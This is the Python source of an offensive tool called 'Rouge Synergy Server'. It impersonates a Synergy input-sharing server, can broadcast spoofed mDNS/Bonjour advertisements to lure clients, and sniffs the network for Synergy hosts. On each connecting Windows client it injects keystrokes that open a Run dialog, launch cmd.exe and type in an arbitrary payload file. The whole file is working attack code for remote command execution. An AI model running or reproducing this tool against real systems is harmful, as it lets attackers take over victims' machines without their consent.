from __future__ import absolute_import, division, print_function

import sys
import socket
import logging
import argparse
from thread import *
from time import sleep
from scapy.all import *
from zeroconf import ServiceBrowser, ServiceStateChange, ServiceInfo, Zeroconf

def banner():
    banner = '''
   ,-~~-.___.
  / |  x     \\
 (  )        0            _____  _         Rouge Synergy Server
  \_/-, ,----'  ____     |  __ \(_)               ~n00py~
     ====      ||   \_   | |  | |_ ___ ___  ___  _ __   __ _ _ __   ___ ___
    /  \-'~;   ||     |  | |  | | / __/ __|/ _ \| '_ \ / _` | '_ \ / __/ _ \\
   /  __/~| ...||__/|-"  | |__| | \__ \__ \ (_) | | | | (_| | | | | (_|  __/
 =(  _____||________|    |_____/|_|___/___/\___/|_| |_|\__,_|_| |_|\___\___|
                 '''

    print (banner)

def start_listener(port):

    host = ''   # Symbolic name meaning all available interfaces
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print ('Socket created')
    # Bind socket to local host and port
    try:
        s.bind((host, port))
    except socket.error as msg:
        print ('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        sys.exit()
    print ('Socket bind complete')
    # Start listening on socket
    s.listen(10)
    print ('Socket now listening')
    return s

def establish_connection(conn):

    global hosts
    # Function for handling connections. This will be used to create threads
    conn.send('\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x06')  # send version
    data = conn.recv(1024)
    hostname = data[19:]
    print ("Hostname: " + hostname)
    if hostname not in blacklist:
        conn.send('\x00\x00\x00\x04\x51\x49\x4e\x46')  # query screen info
        conn.send('\x00\x00\x00\x04\x43\x49\x41\x4b')  # send resolution change acknowledgement
        sleep(1)
        # send reset options
        conn.send('\x00\x00\x00\x04\x43\x52\x4f\x50\x00\x00\x00\x68\x44\x53\x4f\x50\x00\x00\x00\x18\x48\x44\x43\x4c\x00\x00'
                  '\x00\x00\x48\x44\x4e\x4c\x00\x00\x00\x00\x48\x44\x53\x4c\x00\x00\x00\x00\x53\x53\x43\x4d\x00\x00\x00\x00'
                  '\x53\x53\x43\x53\x00\x00\x00\x00\x58\x54\x58\x55\x00\x00\x00\x00\x43\x4c\x50\x53\x00\x00\x00\x01\x4d\x44'
                  '\x4c\x54\x00\x00\x00\x00\x53\x53\x43\x4d\x00\x00\x00\x00\x53\x53\x43\x53\x00\x00\x00\x00\x53\x53\x56\x52'
                  '\x00\x00\x00\x01\x5f\x4b\x46\x57\x00\x00\x00\x00')
        sleep(1)
        print ("Entering Screen...")
        conn.send('\x00\x00\x00\x0e\x43\x49\x4e\x4e\x00\x00\x00\x8c\x00\x00\x00\x01\x00\x00') # enter the client screen
        sleep(1)
        blacklist.append(hostname)
    else:
        print ("Host \"" + hostname + "\" has already been attacked, restart the server to attack this host again.")
        return False

def open_cmd(conn):
    print ("Opening the command prompt...")
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\xeb\x00\x10\x01\x5b')  # send windows key
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00\x72\x00\x10\x00\x13')  # send r
    conn.send('\x00\x00\x00\x0a\x44\x4b\x55\x50\xef\xeb\x00\x00\x01\x5b')  # release windows key
    sleep(.1)
    command = "cmd.exe"
    i = 0

    while i < len(command):
        conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00' + command[i] + '\x00\x00\x00\x21')  # send cmd.exe
        i += 1
        sleep(.1)
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\x0d\x00\x00\x00\x1c')  # send enter
    sleep(1)

def send_payload(conn, payload):
    i = 0
    print ("Sending payload...")
    while i < len(payload):
        conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00' + payload[i] + '\x00\x00\x00\x21')  # send payload
        i += 1
        sleep(.001)
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\x0d\x00\x00\x00\x1c')  # send enter
    print ("Payload sent!")

def windows_shell(conn,payload):
    if establish_connection(conn) != False:
        open_cmd(conn)
        send_payload(conn, payload)

def get_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('8.8.8.8', 53))
        ip = sock.getsockname()[0]
        sock.close()
    except:
        print ("Attempted to determine your local IP, but could not. Supply the IP of the interface you want to use with --ip")
    return ip

def bonjour(ip_addr):
    print ("Sending Bonjour advertisements")
    zeroconf = Zeroconf()
    if not ip_addr:
        ip_addr = get_ip()
    hostname = socket.gethostname()
    hostname = hostname.split(".", 1)[0]
    print ("Hostname is: " +hostname)
    print ("IP Address is: " + ip_addr)
    services = []
    desc = {'Description': ''}
    amqp_info = ServiceInfo("_synergyServerZeroconf._tcp.local.",
                            "%s._synergyServerZeroconf._tcp.local." % hostname,
                            socket.inet_aton(ip_addr), 24800, 0, 0,
                            desc, "%s.local." % hostname)
    services.append(amqp_info)
    for info in services:
        zeroconf.register_service(info)

    try:
        sleep(2)
    finally:
        print ("Bonjour Advertisements sent!")
    #    print("Unregistering...")
     #   zeroconf.unregister_service(info)
      #  zeroconf.close()

def on_service_state_change(zeroconf, service_type, name, state_change):
    if "Added" in str(state_change):
        if "Server" in str(service_type):
            print ("  New server Identified")
            print ("  Name: " + name)
        if "Client" in str(service_type):
            print("  New client Identified")
            print("  Name: " + name)
    if state_change is ServiceStateChange.Added:
        info = zeroconf.get_service_info(service_type, name)
        if info:
            print("  Address: %s:%d" % (socket.inet_ntoa(info.address), info.port))
            print("  Hostame: %s" % (info.server,))
        else:
            print("")
        print('\n')
    sleep(0.1)

def browser():
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) > 1:
        assert sys.argv[1:] == ['--debug']
        logging.getLogger('zeroconf').setLevel(logging.DEBUG)

    zeroconf = Zeroconf()

    serverBrowser = ServiceBrowser(zeroconf, "_synergyServerZeroconf._tcp.local.", handlers=[on_service_state_change])
    sleep(5)
    clientBrowser = ServiceBrowser(zeroconf, "_synergyClientZeroconf._tcp.local.", handlers=[on_service_state_change])
    print("\nBrowsing services, press any key to start the server...\n")
    trigger = True
    try:
        while trigger == True:
            raw_input("")
            trigger = False
            start()
    except KeyboardInterrupt:
        pass
    finally:
        print ("")
        #zeroconf.close()

def start(payload):
    s = start_listener(24800)
    while 1:
        conn, addr = s.accept()
        print ('Connected with ' + addr[0] + ':' + str(addr[1]))
        start_new_thread(windows_shell, (conn,payload))
    s.close()

blacklist = [] # Blacklist for systems that have alread connected


def main():
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-b','--bonjour',help=' Use this option to broadcast MDNS advertisements when starting the server', required=False, action='store_true')
    parser.add_argument('-s', '--sniff', help=' Use this option to sniff for MDNS advertisements', required=False, action='store_true')
    parser.add_argument('-p', '--payload', help='Filepath to the payload', required=False)
    parser.add_argument('-i', '--ip', help='IP address of listening server', required=False)

    args = parser.parse_args()
    banner()

    if args.sniff:
        print ("Now sniffing for Synergy activity...")
        browser()
    if not args.sniff:
        if args.payload:
            p = open(args.payload, 'r')
            payload = p.read()
            if args.bonjour:
                bonjour(args.ip)
            start(payload)
        else:
            print ("You did not specify a payload file. Use the -p switch")


if __name__ == "__main__":

    main()
